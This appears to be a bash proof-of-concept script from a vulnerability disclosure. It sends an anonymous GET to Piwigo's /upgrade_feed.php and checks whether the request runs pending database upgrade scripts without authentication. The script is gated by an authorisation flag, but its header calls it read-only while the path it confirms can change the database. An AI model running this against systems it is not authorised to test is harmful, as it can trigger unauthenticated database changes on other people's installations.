#!/usr/bin/env bash
# piwigo-upgrade-feed-anon-db-mutation.sh — F-1 PoC.
#
# Anonymous GET against /upgrade_feed.php. The script is read-only — it does
# not modify the database. The vulnerability is observable in the response
# body of this single request: if `piwigo_upgrade` is in desync with
# `install/db/`, the body shows the included scripts; if not, the body shows
# "0 upgrades to apply" and the source-trace in report.md is what proves the
# path is exploitable.
#
# Usage:
#   piwigo-upgrade-feed-anon-db-mutation.sh --base http://localhost:8089 --confirm-authorised
#
# Required flag:
#   --confirm-authorised         the operator asserts this is on an authorised target
#
# Optional:
#   --base URL                   base URL of the Piwigo install (default http://localhost:8089)
#   --evidence FILE              write the response body to FILE (default ./evidence/upgrade-feed-anon-db-mutation.txt)

set -euo pipefail

BASE="http://localhost:8089"
EVIDENCE="./evidence/upgrade-feed-anon-db-mutation.txt"
CONFIRM=0

while [[ $# -gt 0 ]]; do
  case "$1" in
    --base)            BASE="$2"; shift 2 ;;
    --evidence)        EVIDENCE="$2"; shift 2 ;;
    --confirm-authorised) CONFIRM=1; shift ;;
    -h|--help)
      sed -n '2,20p' "$0" | sed 's/^# \?//'
      exit 0
      ;;
    *)
      echo "unknown arg: $1" >&2; exit 2 ;;
  esac
done

if [[ "$CONFIRM" -ne 1 ]]; then
  echo "refusing to run without --confirm-authorised" >&2
  echo "this PoC is for targets you are authorised to test" >&2
  exit 1
fi

mkdir -p "$(dirname "$EVIDENCE")"

# Allow env-var override of fixture credentials for testing without rebuilding
DB_USER="${PIWIGO_POC_DB_USER:-piwigo}"
DB_PASS="${PIWIGO_POC_DB_PASSWORD:-piwigo-poc}"
DB_NAME="${PIWIGO_POC_DB_NAME:-piwigo}"
DB_SERVICE="${PIWIGO_POC_DB_SERVICE:-piwigo-poc-db}"
WEB_SERVICE="${PIWIGO_POC_WEB_SERVICE:-piwigo-poc-web}"

echo "[upgrade-feed] GET $BASE/upgrade_feed.php (no cookies, no token)"
HTTP=$(curl -s -o "$EVIDENCE.body" -w '%{http_code}' \
  --no-keepalive \
  "$BASE/upgrade_feed.php")

echo "[upgrade-feed] HTTP $HTTP, body bytes: $(wc -c < "$EVIDENCE.body")"
echo "[upgrade-feed] response body:"
sed 's/^/    /' "$EVIDENCE.body"
echo

PENDING=$(grep -oE '[0-9]+ upgrades to apply' "$EVIDENCE.body" | head -1 | awk '{print $1}' || echo "0")
INCLUDED=$(grep -oE '=== upgrade [0-9]+' "$EVIDENCE.body" | head -3 || true)

# Persist the assertion summary alongside the body
{
  echo "--- response body ---"
  cat "$EVIDENCE.body"
  echo
  echo "--- summary ---"
  echo "HTTP: $HTTP"
  echo "pending: $PENDING"
  echo "include markers: ${INCLUDED:-<none>}"
} > "$EVIDENCE"

if [[ "$PENDING" == "0" ]]; then
  echo "[upgrade-feed] state: 0 pending upgrades. /upgrade_feed.php is reachable, anonymous, and serves the source-traced path on any desynced installation."
  echo "[upgrade-feed] source-trace: see report.md"
  exit 0
fi

if [[ -n "$INCLUDED" ]]; then
  echo "[upgrade-feed] state: $PENDING pending upgrade(s) detected"
  echo "[upgrade-feed] server response includes: $INCLUDED"
  echo "[upgrade-feed] FINDING CONFIRMED — anonymous request triggered include(install/db/<n>-database.php)"
  exit 0
fi

echo "[upgrade-feed] state: $PENDING pending but no '=== upgrade N' marker in body"
echo "[upgrade-feed] non-standard response — review evidence/$EVIDENCE manually"
exit 2
